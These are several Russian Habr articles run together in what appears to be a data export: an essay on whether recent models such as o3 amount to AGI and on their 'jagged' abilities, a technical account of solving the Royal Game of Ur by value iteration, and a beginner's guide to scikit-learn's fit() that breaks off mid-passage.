Недавно в одном нашем исследовании мы тестировали приемы создания промптов и выяснили, что результаты могут кардинально меняться просто в зависимости от того, как сформулированы вопросы. Даже известный тест Тьюринга, где люди пытаются угадать, общаются они с ИИ или с другим человеком, задумывался как мысленный эксперимент в тот период, когда такие задачи казались невозможными. Но по последним данным, ИИ справляется с тестом Тьюринга. И вот здесь нам приходится признать, что мы вообще не знаем, что это значит.
Так что неудивительно, что универсальный искусственный интеллект (AGI), один из важнейших этапов в развитии ИИ, не имеет четкого определения и остается предметом активных обсуждений. Все сходятся на том, что такой ИИ должен решать задачи, как люди. Но непонятно, имеем ли мы в виду уровень эксперта или среднестатистического человека, с какими задачами ИИ должен справиться, чтобы считаться AGI, и сколько таких задач он должен решить. Учитывая неразбериху с определениями AGI, сегодня довольно сложно говорить о нюансах и истории этого понятия, от предыдущих этапов развития до собственно термина, который придумали Шейн Легг, Бен Гертцель и Питер Восс. 
К слову о потенциально интеллектуальных машинах: в качестве эксперимента по форме и содержанию я полностью делегировал работу ИИ. Google Deep Research подготовил для меня солидный доклад по теме аж на 26 страниц. Потом HeyGen превратил его в видеоподкаст, в котором взаимодействовали хост и дерганая версия меня. Причем оба были сгенерированы искусственным интеллектом. Не скажу, что это была плохая дискуссия, хотя я и не во всем согласен с ИИ-версией себя. Но все в этой дискуссии, от самого исследования до видео и звука, на 100% сгенерировано искусственным интеллектом.
Так что интересно было прочитать статью влиятельного экономиста и внимательного обозревателя вопросов ИИ Тайлера Коувена, в которой он утверждает, что o3 — это AGI. С чего он так решил? Вот его цитата:
«Я серьезно думаю, что это AGI. Попробуйте задать ему много вопросов, а затем спросите себя: насколько умнее в моей голове выглядит AGI по сравнению с о3?
Как я уже утверждал в прошлом, AGI, как бы вы его ни определяли, сам по себе не является социальным событием. Нам все равно понадобится много времени, чтобы использовать его должным образом.
Тесты, тесты, бла-бла-бла. Может быть, AGI — это как порно: я узнаю его, когда увижу.
И я это видел».
Прочувствовать AGI
Для начала немного контекста. За последнее время появились две новые ИИ-модели: Gemini 2.5 Pro у Google и o3 у OpenAI. Кроме того, компании выпустили не такие мощные, но зато более быстрые и дешевые модели Gemini 2.5 Flash, o4-mini и Grok-3-mini. И, судя по показателям бенчмарков, эта плеяда — большой шаг вперед в развитии ИИ. 
Но бенчмарки — это еще не все. В моей книге можно найти реальные примеры, подтверждающие, насколько продвинулись эти модели. Для главы о том, как ИИ генерирует идеи, чуть больше года назад я попросил ChatGPT-4 придумать маркетинговые слоганы для нового магазина сыров:
Сегодня я задал чуть более сложную версию того же вопроса преемнику GPT-4, модели o3: «Придумай 20 умных идей маркетинговых слоганов для нового онлайн-магазина сыров. Разработай критерии и выбери лучший вариант. Потом создай для магазина финансовый и маркетинговый план, внеси необходимые правки и проанализируй конкурентов. Потом разработай подходящий логотип, используя генератор изображений, и сделай прототип сайта магазина. Обязательно размести на сайте 5–10 сортов сыра в соответствии с маркетинговым планом». 
Получив один промпт, ИИ не только придумал слоганы, но и составил из них список от лучшего к худшему, выбрал лучший вариант, выполнил поиск в интернете, придумал логотип, подготовил маркетинговый и финансовый планы и запустил демоверсию сайта. Все это заняло меньше двух минут. Ему не помешали ни достаточно размытые инструкции, ни необходимость полагаться на здравый смысл для принятия решений.
Предполагаю, что модель o3 больше, чем GPT-4, но это не все. Она действует, как думающая модель: по первоначальному ответу видно, что она размышляет. Кроме того, это модель-агент, которая умеет пользоваться инструментами и решать, как добиваться поставленных целей. Она совершает разные действия с помощью разных инструментов, включая поиск в интернете и написание кода, чтобы получить объемные результаты.
Это далеко не единственные удивительные примеры. o3 способна угадывать местоположение по фотографии. Для этого достаточно показать ей фото и дать промпт «угадай, где» (да, это не снимает серьезные соображения по поводу конфиденциальности). И снова мы понимаем, что это не просто модель, а агент: она увеличивает масштаб изображения, выполняет поиск в интернете и в несколько этапов находит правильный ответ.
А еще я загрузил в o3 большой датасет с историческими данными машинного обучения в виде электронной таблицы и попросил ее «выяснить, что это такое, и подготовить отчет со статистической информацией. Представить его в грамотно форматированном PDF-файле с подробными сведениями и графиками». Вот так, по одному промпту, я получил полный анализ датасета. Правда, я выдал ей кое-какую обратную связь, чтобы доработать PDF.
Результаты впечатляют. Поэкспериментируйте с моделями, чтобы посмотреть, что они могут. Gemini 2.5 Pro — это бесплатная модель, такая же «умная», как и o3, хотя у нее меньше агентных способностей. Если вы еще не пробовали ее или o3, потратьте на это несколько минут прямо сейчас. Например, дайте Gemini научную работу и попросите сделать из нее игру, провести мозговой штурм и накидать вам идеи для стартапа или просто впечатлить вас (и подбодрите ее словами «Давай еще, а то я еще не сильно впечатлился...»). Попросите функцию Deep Research подготовить отчет о состоянии вашей отрасли, найти все про товар, который вы собираетесь купить, или написать маркетинговый план по продвижению нового продукта.
Возможно, вам тоже покажется, что вы имеете дело с AGI. А может, и нет. Возможно, ИИ подведет вас, даже если вы выдали ему такой же промпт, как и я. Если так, вы только что столкнулись с «ломаной границей».
«Ломаный» AGI
Мы с коллегами придумали термин Jagged Frontier («ломаная граница», не «взломанная», а именно «ломаная», как «ломаная линия») которым описываем на удивление неравномерные способности искусственного интеллекта. ИИ успешно справится с задачей, которая не каждому эксперту по силам, и затормозит на совершенно непримечательном вопросе. Возьмем к примеру вариацию давней классической головоломки, но слегка «запутаем» ИИ и дадим ему другую, пускай и похожую задачу (эту концепцию впервые исследовал Колин Фразер и расширил Райли Гудсайд). 
«Мальчик попал в аварию, скорая привозит его в больницу. Увидев его, хирург говорит: „Я МОГУ его оперировать!“ Как это возможно?»
o3 предлагает ответ «Хирург — мама мальчика». Это неверно, и это можно понять, если вдуматься в головоломку. Почему ИИ предлагает неверный ответ? Потому что это ответ на классический вариант загадки, демонстрирующий неосознанную предвзятость: «Отец и сын попали в аварию. Отец погиб, а сына доставили в больницу. Хирург говорит „Я НЕ МОГУ его оперировать, этот мальчик — мой сын“. Кто хирург?».
ИИ столько раз «видел» загадку во время обучения, что даже умной модели o3 не удается выполнить генерализацию новой задачи, по крайней мере сначала. И это всего лишь один пример из множества проблем и галлюцинаций, которым подвержены даже самые современные модели. Вот насколько ломаной бывает эффективность ИИ.
Да, ИИ спотыкается на этой головоломке. И при этом справляется с гораздо более сложными задачами или добивается впечатляющих результатов, которые я описал выше. В этом и заключается суть ломаной эффективности. В некоторых задачах на ИИ нельзя положиться. В других он действует просто как сверхчеловек. 
Конечно, то же самое можно сказать и о калькуляторах. Но ведь очевидно, что ИИ и калькулятор — это не одно и то же. ИИ уже справляется с разнообразными задачами, в том числе с теми, на которых его не обучали. Значит ли это, что o3 и Gemini 2.5 — это AGI? Учитывая проблемы с определением, я действительно не знаю. И все же полагаю, что мы можем воспринимать их как своего рода ломаный AGI. Они достигли уровня сверхчеловека во многих областях, и этого достаточно, чтобы изменить наш образ жизни и подход к работе. И в то же время они бывают настолько ненадежными, что часто нужны человеческие познания, чтобы понять, где ИИ справляется нормально, а где тормозит. Конечно, со временем модели станут умнее, и достаточно хороший ломаный AGI все равно может обойти человека почти в любой задаче, даже в той, которая дается ему с трудом.
А важно ли это
Вернемся к статье Тайлера. Хотя он полагает, что мы достигли AGI, он не считает, что этот рубеж как-то серьезно повлияет на нашу жизнь в ближайшее время. Потому что технологии не меняют мир мгновенно, какими бы притягательными и мощными они ни были. Социальные и организационные структуры меняются намного медленнее технологий, да и на распространение самой технологии тоже нужно время. Даже если AGI уже появился, мы будем встраивать его в наш мир еще многие годы.
Конечно, мы исходим из того, что ИИ — это обычная технология, которая всегда будет немного ломаной. Может быть, это не так. Мы уже видели, какие агентные возможности есть у модели o3: она способна разбивать на части сложные задачи, использовать инструменты и самостоятельно выполнять многоэтапные планы. Может быть, благодаря этим характеристикам ИИ будет распространяться значительно быстрее обычных технологий. Если вместо интеграции в антропогенные системы ИИ сможет самостоятельно и эффективно работать с ними, возможно, эта технология укоренится со скоростью, которой история человечества еще не видела.
Это не единственная неопределенность: непонятно, есть ли границы возможностей, перейдя которые, мы кардинальным образом изменим подход к интеграции этих систем в обществе? Или ситуация будет улучшаться постепенно? Или LLM-модели упрутся в стену и перестанут совершенствоваться? Признаться честно, мы не знаем, что будет.
Ясно только, что перед нами простирается терра инкогнита. Последние модели резко отличаются от предыдущих, называем мы их AGI или нет. Из-за их агентных свойств в сочетании с ломаной эффективностью возникают беспрецедентные ситуации в мировой истории. Возможно, история так и останется нашим лучшим ориентиром, а процесс успешного внедрения ИИ в мировую экономику растянется на десятилетия. А может быть, мы вот-вот станем свидетелями стремительного взлета, когда искусственный интеллект сметет привычный нам мир. В любом случае тот, кто научится лавировать в этом ломаном ландшафте, успеет лучше остальных подготовиться к будущему, каким бы оно ни было.
Подписывайтесь на канал Данные на стероидах. Дайджесты мира Data и ML, а также практики и подходы для извлечения максимальной пользы из работы с данными."
Математическое решение царской игры Ура,https://habr.com/ru/articles/907912/,"Мы потратили семь лет на эксперименты с ИИ для царской игры Ура, и, наконец, пришли к сильному решению по правилам Финкеля, Блица и Мастерса! В конечном итоге, для этого понадобилась пара красивых ура...","Мы потратили семь лет на эксперименты с ИИ для царской игры Ура, и, наконец, пришли к сильному решению по правилам Финкеля, Блица и Мастерса! В конечном итоге, для этого понадобилась пара красивых уравнений, которые я объясню в статье.
На самом деле, мы не «просто» нашли сильное решение игры. Для сильного решения необходимо находить наилучший ход из каждой позиции. Мы сделали это, плюс вычислили точную вероятность победы каждого игрока при оптимальной игре из каждой позиции. Для этого мы воспользовались нашей опенсорсной библиотекой RoyalUr-Java.
Ниже мы опишем, как это работает. Также мы написали технический отчёт.
Идеальная партия
Прежде, чем переходить к подробностям, покажем небольшое живое демо. В нём два бота участвуют в ничейной дуэли — это идеальная партия! Лично меня это завораживает. Как часто вам доводится наблюдать за чем-то математически идеальным?
Идеальная партия в Royal Game of Ur между двумя ботами. Чтобы ускорить игру, мы не отображаем кости. Вы сами можете сыграть с идеальным ботом.
Идеальность означает максимизацию вероятности выигрыша
Чтобы создать идеально играющего бота, нужно чтобы он максимизировал свою вероятность выигрыша.
В отличие от шахмат или го, при игре в царскую игру Ура нельзя заранее спланировать идеальную победу. Этого не позволят сделать кости! Из-за этого решение царской игры Ура фундаментально отличается от решения игр без вероятностей.
Вместо того, чтобы планировать единственный путь к победе, нам нужно учитывать каждый возможный будущий путь, который становится возможен или невозможен из-за бросков костей, а затем взвесить их все при выборе ходов. Это взвешивание вариантов будущего развития делает решение игры Ура больше похожей на решение покера, чем шахмат.
Для обработки вероятностей мы используем итерации состояний среды
Как же вычислить, какой ход максимизирует вероятность нашей победы, если до конца игры может пройти сотни ходов? Мы используем для этого итерацию состояний среды.
Итерация значений позволяет нам воспользоваться преимуществом игры Ура, а именно относительно низким количеством состояний. Например, по правилам Финкеля есть всего 276 миллионов состояний. Этот размер достаточно мал для того, чтобы можно было хранить весь граф состояний для правил Финкеля в памяти. Затем можно использовать итерацию состояний среды для распространения вероятности выигрыша или проигрыша обратно на весь процесс игры.
Имитация состояний среды обратным распространением потока состояний по графу.
Выше показан упрощённый пример того, как итерация состояний среды модифицирует граф. Значения перемещаются от состояния к состоянию, изначально из состояний победы или проигрыша, а затем обратно, к началу игры. В этом примере значение, к которому приходит каждое состояние — это вероятность оказаться во состоянии победы, если выполнить случайный переход из этой точки.
В более крупных графах, например, в графе царской игры Ура, я предпочитаю воспринимать итерацию состояний среды, как симуляцию жидкости. «Вероятность выигрыша» — это жидкость, которая медленно течёт обратно по всей партии игры. Особенно удобно то, что вероятности, к которым приходит итерация состояний среды — это наша вероятность выигрыша!
Анимация процесса вычисления вероятности выигрыша игрока светлыми фишками из каждой позиции игры
Как работает итерация состояний среды?
Основной принцип итерации состояний среды таков: мы распространяем победы и проигрыши обратно.
Пример: если вы знаете, насколько хороши следующие позиции, которых вы можете достичь, то можете вычислить, насколько хороша текущая позиция. А зная, насколько хороша эта позиция, можете вычислить, насколько хороши были позиции до неё и так далее...
При помощи этой методики мы можем пройти назад по всей игре, обновляя значения состояний на основании состояний, идущих после них.
Обратный проход
Этот обратный проход реализован с помощью простого взвешенного среднего. Вероятность выигрыша в одном состоянии равно взвешенному среднему вероятности выигрыша во всех состояниях после каждого броска костей (пока мы не будем рассматривать выбор хода).
При помощи этой простой операции мы каскадно распространяем победы и проигрыши по пространству царской игры Ура.
Достаточно ли этого? К сожалению, нет. Из-за петель в графе состояний одного обратного прохода оказывается недостаточно. Есть неудобные позиции, в которых можно сыграть множество ходов и вернуться к той же позиции, которая была до них. Основная ценность итерации состояний среды заключается в решении этих петель.
Вычисление вероятности выигрыша в одной позиции на основании соседних позиций, которых игрок достигнет после броска костей
Нам понадобится множество обратных проходов
Именно благодаря итерации мы можем работать с петлями. Вместо того, чтобы делать один обратный проход, мы выполняем несколько. При каждом выполняемом проходе наши оценки вероятности выигрыша из каждой позиции становятся точнее.
Недостаточность одного обратного прохода из-за петель вызвана тем, что процент выигрыша в некоторых состояниях будет некорректным, если использовать его для вычисления вероятности выигрыша другого состояния. Их значение некорректно, потому что только что вычисленное состояние может влиять на состояния, использованных в этих вычислениях (циклическая зависимость)!
Диаграмма, показывающая, как взятие фишки может привести к петле в посещаемых состояниях игры
Оказывается, было доказано, что используемые нами уравнения со временем сходятся. Мы знаем это, потому что уравнения, применяемые нами для решения царской игры Ура — это формулировки уравнений Беллмана. А в математике доказано, что уравнения Беллмана со временем сходятся.
Как оценивать ходы, которые делают противники?
Это очень важная особенность! И она тесно связана с ограничением решений любых игр, содержащих вероятности.
В любой игре, содержащей вероятности, лучшая стратегия выигрыша сильно зависит от того, что делает противник. Однако мы не можем спрогнозировать особенности и склонности каждого игрока. Поэтому мы предполагаем, что оба игрока играют оптимально, делая по очереди наилучшие ходы.
Исходя из предположения об оптимальной игре противников, мы можем вычислить стратегию, при которой ни один из игроков не может повысить свою вероятность победы изменением своих ходов. Такой тип стратегии называется равновесием Нэша. Эту стратегию невозможно победить. Но в то же время эта стратегия не всегда замечает и использует погрешности в игре противника. Нам приходится идти на этот компромисс.
Оказалось, что для вычисления оптимальной игры достаточно простого «жадного» решения. В каждом состоянии мы предполагаем, что игрок совершит ход, который приведёт к наибольшей вероятности выигрыша. Хотя процент победы, используемый нами для принятия этого решения, поначалу может быть некорректным, он всё равно достаточно хорош, чтобы проценты выигрыша со временем могли сойтись.
Внутри нашего ядра итерации состояний среды выбор оптимального хода для каждого игрока представлен максимумом или минимумом среди значений его возможных ходов.
Окончательный обзор итерации состояний среды
Итак, мы поняли, как можно вычислять значение одного состояния на основании других состояний. Давайте объясним, как эти части объединяются в конечное множество уравнений, и как мы применяем их для создания решённой таблицы игры.
Взвешенное среднее и выбор хода образуют простое ядро. Это ядро комбинирует взвешенное среднее с нашим оптимальным выбором хода. Мы итеративно применяем это ядро ко всем состояниям в игре снова и снова, пока вероятности выигрыша не сойдутся. Применяя это ядро, мы используем его для обновления значений V(state) в таблице, пользуясь другими значениями из той же таблицы.
Нашим конечным результатом становится таблица состояний и значений. Создаваемая конечная таблица будет содержать наши оценки вероятности выигрыша каждого игрока из каждой позиции. Далее мы можем использовать эту таблицу, чтобы обеспечить оптимальную игру агентов, заставив их выбирать ход, приводящий в состояние с наибольшей вероятностью победы.
В этом и заключается итерация состояний среды! Она позволила нам решить царскую игру Ура с точностью, ограниченной лишь точностью 64-битных чисел с плавающей запятой. В случае правил Финкеля это означает вычисление вероятности победы с точностью до 3E-14%, или 0,00000000000003%. Мне кажется, это очень круто.
А теперь давайте ускорим вычисления! Настало время оптимизации.
Процесс, выполняемый итерацией состояний среды для поиска идеального решения
Урезаем игру ради скорости!
Выполнение итерации состояний среды для всей игры — это и затратно, и неэффективно. В течение тысячи итерации, необходимых для обучения наших моделей, возникла лишь узкая граница состояний, со временем сходящихся к своему истинному значению. Состояния, более близкие к состоянию победы, уже сошлись, а у отдалённых состояний ещё недостаточно информации для схождения.
Нам бы очень хотелось обновлять только те состояния, которые близки к схождению на каждой итерации, чтобы не тратить время на обновление всех остальных. К счастью, есть один хитрый трюк, позволяющий это сделать!
После вывода фишки с доски вернуть её невозможно.
Выведя фишку, её нельзя вернуть [прим. пер.: по правилам в интерпретации Финкеля для победы игроку нужно вывести все свои фишки с поля]. Эта, казалось бы, несущественная деталь даёт нам огромное преимущество: она разрывает все петли в графе состояний. Поэтому состояния после вывода фишки не могут зависеть от состояний до них.
Это очень важно! Это позволяет нам разбить одну большую игру Ура на множество мелких «мини-игр». После вывода фишки мы переходим от одной мини-игры к другой. Благодаря этому мы получаем преимущество при обучении моделей, потому что каждая из этих мини-игр зависит только от собственных состояний и от состояний, следующих мини-игр, которых можно достичь.
Поэтому можно обучать модель не всей игре целиком, а одной за другой каждой из этих маленьких игр. А поскольку каждая из этих мини-игр намного меньше целой партии, обучаться им можно более эффективно с гораздо меньшей тратой лишних ресурсов! Благодаря этому время решения игры по правилам Финкеля на моём M1 Macbook Pro снизилась с 11 часов до менее чем 5 часов.
Группы, в которые мы упорядочиваем состояния — это «мини-игры» и их зависимости. Показанные на изображении группы описывают правила для трёх начальных фишек.
Хранение всех вероятностей победы в плотно упакованной таблице
Ещё один важный при решении царской игры Ура вопрос — обеспечение эффективного использования памяти.
Нам нужна таблица поиска для каждой позиции игры вероятности того, что игрок выиграет, начиная с этой позиции. Для правил Финкеля (самых популярных) это означает создание карты из 275827872 уникальных позиций. Для правил Мастерса она ещё крупнее, более миллиарда позиций.
Как же нам создавать эти большие таблицы? Мы решили, что лучше всего ещё больше усложнить процесс! Нас волновало использование памяти, поэтому создали собственную реализацию таблиц, оптимизированную под этот аспект.
Наши таблицы состоят из плотно упакованных двоичных ключей и значений. Мы не хэшируем ключи для поиска элементов, как это делается обычно, а сортируем ключи и используем двоичный поиск. Это позволяет сохранять минимально возможный размер таблиц, обеспечивая при этом высокую скорость.
Благодаря нашей переусложнённой таблице мы можем снизить потребление памяти до всего 12 байтов на каждый элемент таблицы, то есть полное решение по правилам Финкеля уместится всего в 1,6 ГБ. А сжатые версии занимают всего 827 МБ, если вас устроит точность в пределах 0,01%.
Визуализация различий структур памяти между хэш-таблицами и нашей реализацией таблицы.
Запись состояний игры в 32-битные ключи
Ключи поиска в нашей таблице обозначают каждую позицию, которой можно достичь в игре. Эти позиции (состояния) — это «снимки» игры в конкретный момент, в том числе и порядок хода, количество фишек и очков у каждого из игроков, а также расположение фишек на поле. Для каждого из этих состояний мы сохраняем вероятность победы игрока со светлыми фишками, если в дальнейшем оба игрока будут играть идеально.
Чтобы использовать как можно меньше памяти, мы закодировали состояния в небольшие двоичные числа. По правилам Финкеля мы кодируем состояния в 32 бита. Для упаковки всей этой информации нужны небольшие хитрости...
Самый простой способ упаковки состояния в двоичный вид по правилам Финкеля потребовал бы 54 бита:
1 бит: чей сейчас ход?
1 бит: в игре уже кто-то выиграл?
2 x 3 бита: фигуры и очки игрока со светлыми фишками.
2 x 3 бита: фигуры и очки игрока с тёмными фишками.
20 x 2 бита: содержимое каждой плитки на поле (они могут быть пустыми, содержать светлую фишку или тёмную фишку).
Простой, но неэффективный двоичный формат, который можно использовать для кодирования состояний игры в ключи.
54 бита — это не так уж плохо. Для хранения таких ключей можно использовать стандартные 64 битные числа, и это всё равно окажется достаточно быстро и эффективно по памяти. Но разве не здорово будет здорово, если удастся уместить всё в 32 бита?
К счастью, можно воспользоваться простыми трюками для снижения необходимого количества битов.
Первым делом стоит отметить, что часть информации в ключах избыточна. Количество фишек, которое осталось у игроков, и то, настало ли состояние выигрыша, можно вычислить из другой информации, хранящейся в ключах. Следовательно, мы можем убрать эти значения и сэкономить 7 битов!
Ещё от 12 битов можно избавиться, поменяв способ хранения плиток, достижимых только для одного игрока. Мы называем эти плитки «мирными зонами». Так как доступ к ним есть только у одного игрока, нам нужно только по 1 биту на каждую. Это вдвое уменьшает место, необходимое для хранения этих плиток, и мы получаем суммарный размер ключа в 35 бита. Уже довольно близко к желаемым 32 битам!
Мирные (S) и военные (W) плитки по правилам Финкеля. Мирные плитки имеют зелёный цвет, военные — красный.
Оставшиеся 3 бита можно убрать, сжав плитки военной зоны. До сжатия каждая военная плитка использует 2 бита для хранения одного из трёх состояний (пустая, светлая фишка, тёмная фишка). Это значит, что в 2 битах есть дополнительное четвёртое состояние, которое мы не используем. Иными словами, можно выполнить сжатие!
Для сжатия военной зоны мы создаём список всех допустимых 16 битных вариаций, которые может принимать военная зона, и присваиваем их новым меньшим числам при помощи небольшой таблицы поиска. Это позволяет нам сжать 16 битов до 13, добившись нашей цели — 32 битов!
Игра Ура симметрична — симметрична Ура игра
В качестве вишенки на торте мы можем удалить и бит хода, потому что царская игра Ура симметрична. На самом деле, это достаточно важно! Это значит, что если поменять местами светлого и тёмного игроков, то их вероятность победы остаётся той же. Это очень полезно, ведь благодаря этому можно хранить и вычислять лишь половину игровых состояний. Очень солидная экономия!
Двоичный формат, который мы используем для кодирования состояний игры по правилам Финкеля в ключи.
Теперь у нас есть 31-битная кодировка, которую можно применять для хранения ключей в таблице! Теоретически, минимальное количество битов, которое необходимо для представления всех 137913936 состояний — это 28. Так что мы немного не дотягиваем, но меня вполне устраивает, что мы на расстоянии всего 3 битов до идеала!
Для других правил потребуется больше 32 битов
К сожалению, при попытке перейти к другим правилам мы столкнулись с препятствием. В случае правил Мастерса и Блица мы при помощи тех же методик смогли сжать состояние всего до 34 битов из-за более длинного пути по полю. То есть на 2 бита больше, чем нам требуется...
Но в нашем мешке ещё остались трюки! Вместо того, чтобы удваивать размер ключа до 64 битов, можно разбить таблицу на 4 части. 2 дополнительных бита можно использовать для выбора части, в которой нужно выполнять поиск, а затем выполнять поиск при помощи оставшихся 32-битов. Это позволило нам уместить полмиллиарда элементов по правилам Мастерса в 3 ГБ вместо 5 ГБ!
Двоичный формат, который мы используем для кодирования в ключи игровых состояний по правилам Блица и Мастерса.
Вот и вся таблица! В нашей реализации нет ничего особенного, но она хорошо подходит для нашей цели — снижения объёма используемой памяти и обеспечения быстрого чтения и записи.
Мы выложили решённую игру в опенсорс
Теперь у вас есть всё необходимое для самостоятельного решения царской игры Ура! Однако если вам больше хочется поэкспериментировать сразу с решённой игрой, то можете воспользоваться несколькими реализациями для обучения и использовать наши модели, выложенные в опенсорс.
Готовые обученные модели выложены на HuggingFace.
Наша Java-библиотека RoyalUr-Java способна считывать и обучать эти модели.
Наша Python-библиотека RoyalUr-Python способна считывать 16-битную модель по правилам Финкеля.
Реализация на Julia разработчика Jeroen позволяет быстро обучать модели, использующие другой формат файлов.
Raph выпустил Lut Explorer, при помощи которого можно исследовать различные позиции решённой игры.
Если вы займётесь экспериментами с решённой игрой, то нам бы любопытно было узнать, чего вы смогли добиться! Если вам любопытно, приглашаю вас в наш Discord. У нас есть канал, посвящённый обсуждениям исследований, подобных тем, о котором я рассказывал выше.
Теперь отойдём от технических подробностей и поговорим о том, как решение царской игры Ура соотносится с областью ИИ в целом.
Можем ли мы решить другие игры?
Сложно найти игру, столь же подходящую для итерации состояний среды, как царская игра Ура. Из-за элемента удачи, неконечного геймплея и ограниченного количества позиций итерация состояний среды идеально подходит для её решения. Для других игр она подходит не так хорошо.
Некоторые игры, которые мне бы хотелось решить, например короткие нарды, имеют слишком много позиций, чтобы их можно было решать итерацией состояний среды. У игры Ура примерно 276 миллиардов позиций, а у коротких нард — примерно 100 квинтиллионов... Это значит, что для решения коротких нард при помощи итерации состояний среды потребуется столько памяти, что эта задача не представляется возможной. Понадобилось бы примерно 3% от общемирового размера хранилищ данных, или триллион гигабайтов.
Решение других популярных игр, например, «Четыре в ряд» (Connect-Four) или покера на костях (Yahtzee) при использовании итерации состояний среды было бы неэффективным. В Connect-Four нет костей, поэтому её эффективнее будет решать при помощи поиска. В Yahtzee есть кости, но она упрощена своим неизбежным движением вперёд. Выполнив действие в Yahtzee, вы ни за что не сможете вернуться к состоянию до этого действия; поэтому Yahtzee эффективнее решать, оценивая партию сзади вперёд.
По нашим оценкам, любую игру со сложностью пространств-состояний порядка 1E+11 или ниже реалистично решать при помощи итерации состояний среды. Это отсекает возможность применения итерации для решения более сложных игр, в том числе и коротких нард.
Метрики сложности пространства-состояния и дерева популярных игр, в том числе и царской игры Ура.
Именно поэтому, несмотря на то, что решение игры Ура стало примечательным достижением для игры, оно не будет прорывом в решении более сложных игр. Могут существовать некоторые игры с вероятностями и полной информацией, для которых можно найти сильное решение при помощи итерации состояний среды. Но сама по себе итерация не позволит нам решать сложные игры наподобие коротких нард.
Тем не менее, мы не должны полностью сбрасывать со счетов итерацию состояний среды! На напряжённых последних ходах настольной игры итерация состояний среды может принести много пользы. Продвинутые ИИ-системы для игр часто используют базы данных для безошибочных ходов в эндшпиле, а итерация состояний — это одна из методик, которые можно использовать для создания таких баз данных. Например, базы данных часто используются для идеальных стратегий конца игры в коротких нардах. Схожие техники можно также использовать для идеальных ходов в других играх наподобие лудо или парчиси!
Для чего мы будем использовать решённую игру?
Решение игры позволяет нам вычислять точность игрока в играх, создавать подробный анализ партий и дать игрокам идеального соперника (Panda). Всё это сильно влияет на то, как игроки играют в царскую игру Ура на нашем сайте.
Если вам интересно почитать о том, что это значит для игры Ура, можете изучить наш пост.
Скриншот анализа игры."
fit() для новичков,https://habr.com/ru/companies/otus/articles/905858/,"Привет, Хабр!
Эта статья для тех, кто только‑только погружается в машинное обучение и ещё не до конца понимает, что скрывается за интересным вызовом model.fit(). Вы, возможно, уже настраивали ноутбуки...","Привет, Хабр!
Эта статья для тех, кто только‑только погружается в машинное обучение и ещё не до конца понимает, что скрывается за интересным вызовом model.fit(). Вы, возможно, уже настраивали ноутбуки, пробовали разные датасеты и, может, даже словили пару неожиданных ошибок — и это нормально.
Зачем копать глубже за fit()
На старте может казаться, что достаточно написать:
model = RandomForestClassifier(n_estimators=100)
model.fit(X_train, y_train)
— и всё заработает. Но стоит проекту вырасти, можно столкнуться с подвохами:
Неожиданные NotFittedError при predict()
Упавшая память на больших выборках
Странное поведение при дообучении
Сложности в интеграции конвейеров и трансформеров
Зная почему так происходит, можно оптимизировать время обучения, контролировать ошибки и выстроить гибкий пайплайн. Сначала разберём, как fit() проверяет наши данные, а затем пройдёмся по остальным этапам.
Валидация данных
Сразу после вызова fit(X, y) у модели запускается внутренняя проверка — validatedata. И да, это не просто формальность:
Преобразование: если вы передали pandas.DataFrame, он конвертируется в numpy.ndarray.
Сверка размеров: число строк в X должно совпадать с длиной y.
Обработка пропусков: np.nan и разреженные форматы распознаются и обрабатываются.
Приведение типов: целочисленные и низкоточные данные автоматически приводятся к float64, чтобы алгоритмы могли нормально считать градиенты.
Представьте, вы случайно передали 100 строк признаков, а меток всего 99 — без этой проверки обучение просто рухнет где‑то в глубинах C‑библиотек с непонятным «segmentation fault». А так вы получите понятную ошибку и сможете сразу исправить проблему.
Куда же уходят ваши настройки и гиперпараметры?
Сохраняем гиперпараметры: BaseEstimator в действии
Все алгоритмы в scikit-learn наследуют BaseEstimator. При создании объекта, допустим:
model = LogisticRegression(C=0.1, penalty='l2')
— параметры C и penalty аккуратно ложатся в атрибут dict. Благодаря этому:
Модель можно клонировать clone(model) с теми же настройками. GridSearchCV переберёт все комбинации гиперпараметров. При сериализации joblib.dump можно быть уверенным, что вы не потеряете ни одного значения.
С настройками разобрались, дальше — где и как происходит само обучение.
Собственно обучение: что таится в _fit()
Метод fit() передаёт дело приватному _fit(), где и идёт основная математика.
Линейная регрессия решает нормальные уравнения:
X_aug = np.hstack([np.ones((n,1)), X])  # добавляем единичный столбец
theta = np.linalg.solve(X_aug.T.dot(X_aug), X_aug.T.dot(y))
self.intercept_, self.coef_ = theta[0], theta[1:]
Решаем систему уравнений, только на миллионах строк.
Стохастический градиентный спуск (SGDClassifier):
w = np.zeros(n_features)
for epoch in range(max_iter):
    for Xi, yi in shuffle(X, y):
        grad = compute_gradient(w, Xi, yi)
        w -= eta * grad
Здесь важно правильно подобрать learning_rate (eta): слишком большой — не схватится за минимум, слишком маленький — будет ползти вечность.
Деревья решений рекурсивно разбивают выборку по лучшим признакам, чтобы минимизировать энтропию или MSE — об этом можно писать отдельный роман, но суть в том, что каждый сплит — это отдельное вычисление статистики.
Когда вычисления завершены, результаты куда‑то записываются — давайте взглянем, куда именно.
Куда деваются результаты — атрибуты с подчёркиванием
После обучения у модели появляются атрибуты, оканчивающиеся на _:
coef_, intercept_ у линейных моделей
classes_ у классификаторов
feature_importances_ у ансамблей деревьев
статистические буферы (n_iter_, история градиентов и пр.)
Чтобы убедиться, что модель обучена, я всегда использую:
from sklearn.utils.validation import check_is_fitted
check_is_fitted(model)
— и если что‑то упущено, получите дружелюбный NotFittedError.
Различия между fit(), transform() и fit_transform()
fit(X, y): готовит модель к работе — валидация и вычисление внутренних параметров.
transform(X): применяет уже посчитанные параметры для преобразования данных (нормализация, PCA и др.).
fit_transform(X): объединение первых двух шагов для трансформеров, экономя одну итерацию по данным.
Например:
scaler = StandardScaler()
X_scaled = scaler.fit_transform(X)  # за один проход
X_new = scaler.transform(X_test)    # применяем те же параметры
Иногда модели умеют оптимизировать fit_transform(), объединяя вычисления в один цикл.
Но что если объём данных огромен или они приходят потоком? Тогда без partial_fit() не обойтись.
Онлайн-обучение и partial_fit()
Когда данные не помещаются в память или приходят постоянно, используем partial_fit():
from sklearn.linear_model import SGDClassifier
clf = SGDClassifier(max_iter=1, tol=None)
# Первый батч: нужно явно указать все классы
clf.partial_fit(X_batch1, y_batch1, classes=np.unique(y_full))
for Xb, yb in get_next_batches():
    clf.partial_fit(Xb, yb)
Каждый вызов берёт новую порцию данных и продолжает обучение с текущих весов, не забывая историю градиентов.
А если хочется добавить новые деревья в лес без пересчёта старых? Тогда выручит warm_start.
warm_start:
У многих ансамблей RandomForest, GradientBoosting есть опция warm_start. Вот как она работает на практике:
Создаём лес из 50 деревьев:
rf = RandomForestClassifier(n_estimators=50, warm_start=True)
